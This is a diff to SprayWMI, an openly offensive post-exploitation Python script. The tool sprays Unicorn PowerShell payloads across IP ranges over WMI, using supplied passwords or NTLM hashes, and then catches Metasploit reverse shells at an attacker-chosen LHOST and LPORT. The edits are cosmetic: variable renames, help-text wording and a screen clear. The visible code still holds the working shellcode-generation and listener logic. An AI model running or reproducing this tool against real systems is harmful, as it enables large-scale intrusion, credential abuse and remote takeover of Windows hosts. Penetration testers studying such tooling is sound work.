@@ -21,6 +21,8 @@ import os
 import sys
 import time
 definepath = os.getcwd()
+os.system('clear')
+
 unicorn = ("/pentest/post-exploitation/unicorn/")
 if not os.path.isdir("/pentest/post-exploitation/unicorn/"):
 	if not os.path.isdir(definepath + "/unicorn/"):
@@ -57,8 +59,8 @@ try:
 	password = sys.argv[3]  # Password or password hash LM:NTLM to use on the remote Windows system.
 	cidr = sys.argv[4]      # CIDR format or a file containing IPs. 
 	meta = sys.argv[5]      # Metasploit payload, example: windows/meterpreter/reverse_tcp
-	revshell = sys.argv[6]  # Reverse shell IP address (LHOST).
-	revport = sys.argv[7]   # Reverse shell listening port (LPORT).
+	lhost = sys.argv[6]     # Reverse shell IP address (LHOST).
+	lport = sys.argv[7]     # Reverse shell listening port (LPORT).
 	try:
 		if sys.argv[8] == "no": # Optional variable to spawn listener.
 			optional = "no"
@@ -78,20 +80,20 @@ except IndexError:
                                      """)
 	print ("SprayWMI is a method for mass spraying Unicorn PowerShell injection to CIDR notations.\n")
 
-	print ("""Flag descriptions:
+	print ("""Flags and descriptions:
 
-DOMAIN                 Domain you are attacking. If its local, just specify workgroup.
-USERNAME               Username to authenticate on the remote Windows system.
-PASSWORD               Password or password hash LM:NTLM to use on the remote Windows system.
-CIDR_RANGE or file     Specify a single IP, CIDR range (192.168.1.1/24) or multiple CIDRs: 192.168.1.1/24,192.168.2.1/24. 
-                          You can also specify a file (ex: file.txt) that contains a single IP addresses on each line. 
-METASPLOIT_PAYLOAD     Metasploit payload, example: windows/meterpreter/reverse_tcp
-REVERSE_SHELL_IP       Reverse shell IP address (LHOST).
-REVERSE_SHELL_PORT     Reverse shell listening port (LPORT).
-OPTIONAL: NO           Specify no if you do not want to create a listener. This is useful if you already have a listener 
+domain                 Domain you are attacking. If its local, just specify workgroup.
+username               Username to authenticate on the remote Windows system.
+password               Password or password hash LM:NTLM to use on the remote Windows system.
+CIDR range or file     Specify a single IP, CIDR range (192.168.1.1/24) or multiple CIDRs: 192.168.1.1/24,192.168.2.1/24. 
+                          You can also specify a file (ex: ips.txt) that contains a single IP addresses on each line. 
+payload                Metasploit payload, example: windows/meterpreter/reverse_tcp
+LHOST                  Reverse shell IP address.
+LPORT                  Reverse shell listening port.
+optional: NO           Specify no if you do not want to create a listener. This is useful if you already have a listener 
                           established. If you do not specify a value, it will automatically create a listener for you.
 """)
-	print ("Usage: python spraywmi.py <domain> <username> <password or hash lm:ntlm> <cidr_range,cidr_range or ips.txt> <metasploit_payload> <reverse_shell_ip> <reverse_shell_port> <optional: no>\n")
+	print ("Usage: python spraywmi.py <domain> <username> <password> <CIDRrange or file> <payload> <LHOST> <LPORT> <optional: no>\n\n")
 	sys.exit()
 
 print ("[*] Launching SprayWMI on the hosts specified.")
@@ -100,7 +102,7 @@ print ("[*] Launching SprayWMI on the hosts specified.")
 if os.path.isfile(unicorn + "/unicorn.py"):
 	os.chdir(unicorn)
 	print ("[*] Generating shellcode through Unicorn This could take a few seconds.")
-	subprocess.Popen("python unicorn.py %s %s %s" % (meta, revshell, revport), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+	subprocess.Popen("python unicorn.py %s %s %s" % (meta, lhost, lport), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 	if optional == "":
 		print ("[*] Launching the listener in the background.")	
 		time.sleep(1)
@@ -162,7 +164,7 @@ if counter == 1:
 	print ("[*] Spraying is still happening in the background, shells should arrive as they complete.")
 	
 	if optional == "":
-		print ("[*] Interacting with Metasploit...")
+		print ("[*] Interacting with Metasploit.")
 		# Interact with Metasploit.
 		child.interact()
 	else:
